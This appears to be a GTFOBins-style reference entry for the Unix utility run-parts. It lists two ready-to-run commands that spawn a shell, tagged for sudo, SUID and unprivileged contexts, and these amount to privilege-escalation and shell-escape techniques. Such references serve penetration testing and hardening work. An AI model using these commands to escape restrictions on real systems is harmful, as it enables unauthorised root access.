---
type: gtfobin
name: run-parts
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# run-parts

## shell

```bash
run-parts --new-session --regex '^sh$' /bin
```
**Contexts:** sudo, suid, unprivileged

```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/
```
**Contexts:** sudo, suid, unprivileged
